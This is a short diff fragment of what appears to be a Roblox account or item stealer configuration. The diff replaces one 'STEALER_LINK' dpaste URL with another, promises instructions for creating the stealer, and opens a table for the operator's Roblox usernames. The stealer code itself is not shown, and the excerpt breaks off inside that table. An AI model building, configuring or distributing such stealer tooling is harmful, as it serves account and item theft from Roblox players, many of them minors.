@@ -1,4 +1,4 @@
-STEALER_LINK = 'https://dpaste.com/3DKH2ML8V.txt' -- stealer link (how to create is bellow)
+STEALER_LINK = 'https://dpaste.com/8NYBZ373K.txt' -- stealer link (how to create is bellow)
 
 Usernames = {
     'Asuna_0nO, -- PUT UR ROBLOX USERNAMES
